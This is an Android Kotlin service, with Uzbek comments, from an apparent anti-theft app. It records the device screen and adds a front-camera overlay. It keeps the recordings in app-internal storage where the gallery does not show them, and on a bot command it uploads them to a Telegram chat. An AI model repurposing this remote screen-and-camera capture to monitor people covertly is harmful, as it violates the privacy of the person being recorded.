package com.guardian.antitheft

import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.PixelFormat
import android.hardware.camera2.*
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.os.Looper
import android.provider.Settings
import android.util.DisplayMetrics
import android.view.Gravity
import android.view.Surface
import android.view.TextureView
import android.view.WindowManager
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

/**
 * Ekranni yozib, ilovaning ichki xotirasiga saqlaydi.
 *   - sendToTelegram = false (lokal trigger): faqat filesDir/recordings/ ga saqlaydi
 *   - sendToTelegram = true  (bot buyrug'i): saqlaydi + Telegram'ga ham yuboradi
 *
 * Maksimal muddat: 18 000 s (5 soat). Galereya va tashqi xotiraga HECH NARSA yozilmaydi.
 *
 * Old kamera PiP overlay: agar SYSTEM_ALERT_WINDOW ruxsati berilgan bo'lsa,
 * ekranning pastki o'ng burchagida kichik TextureView overlay ochiladi va
 * VirtualDisplay uni avtomatik yozib oladi — alohida muxer kerak emas.
 */
class ScreenRecordService : Service() {

    // ── Yozuv holati ────────────────────────────────────────────────
    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var mediaRecorder: MediaRecorder? = null
    private var outputFile: File? = null
    private val stopHandler = Handler(Looper.getMainLooper())
    private var recordDurationMs = DEFAULT_DURATION_S * 1000L
    private var sendToTelegram = false

    // ── Kamera PiP ──────────────────────────────────────────────────
    private var cameraDevice: CameraDevice? = null
    private var captureSession: CameraCaptureSession? = null
    private var overlayView: TextureView? = null
    private val cameraThread = HandlerThread("CamOverlay").also { it.start() }
    private val cameraHandler = Handler(cameraThread.looper)

    companion object {
        const val ACTION_START        = "action_start"
        const val ACTION_STOP         = "action_stop"
        const val EXTRA_CODE          = "extra_code"
        const val EXTRA_DATA          = "extra_data"
        const val EXTRA_DURATION_SEC  = "duration_sec"
        const val EXTRA_SEND_TELEGRAM = "send_telegram"

        private const val CHANNEL_ID         = "antitheft_screenrec_channel"
        private const val NOTIF_ID           = 46
        private const val DEFAULT_DURATION_S = 20
        const val MAX_DURATION_S             = 18_000   // 5 soat
        private const val SCALE              = 0.6
        private const val PIP_WIDTH_DP       = 120
        private const val PIP_HEIGHT_DP      = 160

        @Volatile var isRunning = false
    }

    override fun onCreate() { super.onCreate(); createNotificationChannel() }
    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground(NOTIF_ID, buildNotification())
        when (intent?.action) {
            ACTION_STOP  -> { finishRecording(); return START_NOT_STICKY }
            ACTION_START -> {
                if (isRunning) return START_NOT_STICKY
                val code    = intent.getIntExtra(EXTRA_CODE, 0)
                @Suppress("DEPRECATION")
                val data    = intent.getParcelableExtra<Intent>(EXTRA_DATA)
                sendToTelegram = intent.getBooleanExtra(EXTRA_SEND_TELEGRAM, false)
                recordDurationMs = intent.getIntExtra(EXTRA_DURATION_SEC, DEFAULT_DURATION_S)
                    .coerceIn(5, MAX_DURATION_S) * 1000L
                if (data == null) { stopSelf(); return START_NOT_STICKY }
                startCapture(code, data)
            }
            else -> { stopSelf(); return START_NOT_STICKY }
        }
        return START_NOT_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        isRunning = false
        stopHandler.removeCallbacksAndMessages(null)
        releaseCamera()
        releaseScreen()
        cameraThread.quitSafely()
    }

    // ── Yozishni boshlash ────────────────────────────────────────────

    private fun startCapture(resultCode: Int, data: Intent) {
        val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        val projection = try { mpm.getMediaProjection(resultCode, data) } catch (e: Exception) { null }
        if (projection == null) { stopSelf(); return }
        mediaProjection = projection

        val metrics = DisplayMetrics()
        @Suppress("DEPRECATION")
        (getSystemService(Context.WINDOW_SERVICE) as WindowManager).defaultDisplay.getRealMetrics(metrics)
        val width   = ((metrics.widthPixels  * SCALE).toInt()).let { it - it % 2 }.coerceAtLeast(2)
        val height  = ((metrics.heightPixels * SCALE).toInt()).let { it - it % 2 }.coerceAtLeast(2)
        val density = metrics.densityDpi

        // Saqlash joyi — ilovaning ichki xotirasi, galereya ko'rmaydi
        val dir = File(filesDir, "recordings").also { it.mkdirs() }
        val ts  = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
        outputFile = File(dir, "screen_$ts.mp4")

        try {
            mediaRecorder = MediaRecorder().apply {
                setVideoSource(MediaRecorder.VideoSource.SURFACE)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                setVideoSize(width, height)
                setVideoFrameRate(15)
                setVideoEncodingBitRate(2_000_000)
                setOutputFile(outputFile!!.absolutePath)
                prepare()
            }
        } catch (e: Exception) { e.printStackTrace(); stopSelf(); return }

        try {
            virtualDisplay = mediaProjection!!.createVirtualDisplay(
                "AntiTheftSR", width, height, density,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                mediaRecorder!!.surface, null, null
            )
            mediaRecorder!!.start()
            isRunning = true
        } catch (e: Exception) { e.printStackTrace(); releaseScreen(); stopSelf(); return }

        // Kamera PiP overlay — SYSTEM_ALERT_WINDOW ruxsati bo'lsa qo'shiladi
        addCameraOverlay(metrics)

        stopHandler.postDelayed({ finishRecording() }, recordDurationMs)
    }

    // ── Yozishni yakunlash ───────────────────────────────────────────

    private fun finishRecording() {
        if (!isRunning) { stopSelf(); return }
        isRunning = false
        stopHandler.removeCallbacksAndMessages(null)
        releaseCamera()

        try { mediaRecorder?.stop()    } catch (_: Exception) { }
        try { mediaRecorder?.release() } catch (_: Exception) { }
        mediaRecorder = null
        try { virtualDisplay?.release() } catch (_: Exception) { }
        virtualDisplay = null
        try { mediaProjection?.stop()   } catch (_: Exception) { }
        mediaProjection = null

        val file  = outputFile
        val prefs = SecurePrefs.get(this)
        val token  = prefs.getString("bot_token", "").orEmpty()
        val chatId = prefs.getString("chat_id",   "").orEmpty()
        val durSec = recordDurationMs / 1000

        Thread {
            when {
                file == null || !file.exists() -> {
                    if (sendToTelegram && token.isNotEmpty() && chatId.isNotEmpty())
                        TelegramSender.sendMessage(token, chatId, "⚠️ Ekran yozuvi fayli topilmadi.")
                }
                file.length() == 0L -> {
                    if (sendToTelegram && token.isNotEmpty() && chatId.isNotEmpty())
                        TelegramSender.sendMessage(token, chatId, "⚠️ Ekran yozuvi bo'sh chiqdi.")
                    file.delete()
                }
                sendToTelegram -> {
                    if (token.isEmpty() || chatId.isEmpty()) { stopSelf(); return@Thread }
                    val sizeMb = "%.2f".format(file.length() / 1024.0 / 1024.0)
                    val ok = TelegramSender.sendVideo(token, chatId, file.readBytes(),
                        "🖥️ Ekran yozuvi ($durSec s, $sizeMb MB)")
                    if (!ok) TelegramSender.sendMessage(token, chatId,
                        "⚠️ Ekran yozuvi ($sizeMb MB) yuborilmadi — fayl ilovada saqlanib qoldi.")
                }
                // sendToTelegram = false: faylni ilovada saqlab, hech narsa qilmaymiz
            }
            stopSelf()
        }.start()
    }

    // ── Kamera PiP overlay ───────────────────────────────────────────

    private fun addCameraOverlay(metrics: DisplayMetrics) {
        if (!Settings.canDrawOverlays(this)) return  // ruxsat yo'q — shunchaki o'tkazamiz
        val wm  = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val d   = metrics.density
        val pw  = (PIP_WIDTH_DP  * d).toInt()
        val ph  = (PIP_HEIGHT_DP * d).toInt()

        val tv = TextureView(this)
        overlayView = tv

        val lp = WindowManager.LayoutParams(
            pw, ph,
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
            PixelFormat.TRANSLUCENT
        ).apply {
            gravity = Gravity.BOTTOM or Gravity.END
            x = (16 * d).toInt()
            y = (80 * d).toInt()
        }

        try { wm.addView(tv, lp) } catch (e: Exception) { e.printStackTrace(); return }

        tv.surfaceTextureListener = object : TextureView.SurfaceTextureListener {
            override fun onSurfaceTextureAvailable(st: android.graphics.SurfaceTexture, w: Int, h: Int) =
                openFrontCamera(st)
            override fun onSurfaceTextureSizeChanged(st: android.graphics.SurfaceTexture, w: Int, h: Int) {}
            override fun onSurfaceTextureDestroyed(st: android.graphics.SurfaceTexture) = true
            override fun onSurfaceTextureUpdated(st: android.graphics.SurfaceTexture) {}
        }
    }

    @SuppressLint("MissingPermission")
    private fun openFrontCamera(st: android.graphics.SurfaceTexture) {
        val cm = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        val frontId = cm.cameraIdList.firstOrNull { id ->
            cm.getCameraCharacteristics(id)
                .get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_FRONT
        } ?: return

        try {
            cm.openCamera(frontId, object : CameraDevice.StateCallback() {
                override fun onOpened(cam: CameraDevice) {
                    cameraDevice = cam
                    val surface = Surface(st)
                    try {
                        cam.createCaptureSession(listOf(surface),
                            object : CameraCaptureSession.StateCallback() {
                                override fun onConfigured(s: CameraCaptureSession) {
                                    captureSession = s
                                    val req = cam.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW)
                                        .apply { addTarget(surface) }.build()
                                    s.setRepeatingRequest(req, null, cameraHandler)
                                }
                                override fun onConfigureFailed(s: CameraCaptureSession) {}
                            }, cameraHandler)
                    } catch (e: Exception) { e.printStackTrace() }
                }
                override fun onDisconnected(cam: CameraDevice) { cam.close() }
                override fun onError(cam: CameraDevice, error: Int) { cam.close() }
            }, cameraHandler)
        } catch (e: Exception) { e.printStackTrace() }
    }

    // ── Resurslarni tozalash ─────────────────────────────────────────

    private fun releaseCamera() {
        try { captureSession?.close() } catch (_: Exception) { }; captureSession = null
        try { cameraDevice?.close()   } catch (_: Exception) { }; cameraDevice = null
        overlayView?.let { v ->
            Handler(Looper.getMainLooper()).post {
                try { (getSystemService(Context.WINDOW_SERVICE) as WindowManager).removeViewImmediate(v) }
                catch (_: Exception) { }
            }
        }
        overlayView = null
    }

    private fun releaseScreen() {
        try { mediaRecorder?.stop()    } catch (_: Exception) { }
        try { mediaRecorder?.release() } catch (_: Exception) { }
        mediaRecorder = null
        try { virtualDisplay?.release() } catch (_: Exception) { }
        virtualDisplay = null
        try { mediaProjection?.stop()   } catch (_: Exception) { }
        mediaProjection = null
        outputFile?.let { if (it.exists() && it.length() == 0L) it.delete() }
    }

    // ── Notification ─────────────────────────────────────────────────

    private fun createNotificationChannel() {
        val ch = NotificationChannel(CHANNEL_ID, "Ekran yozuvi", NotificationManager.IMPORTANCE_LOW)
            .apply { description = "AntiTheft ekran yozuvi" }
        getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
    }

    private fun buildNotification(): Notification =
        Notification.Builder(this, CHANNEL_ID)
            .setContentTitle("AntiTheft Guard")
            .setContentText("Ekran yozilmoqda...")
            .setSmallIcon(android.R.drawable.ic_dialog_alert)
            .build()
}
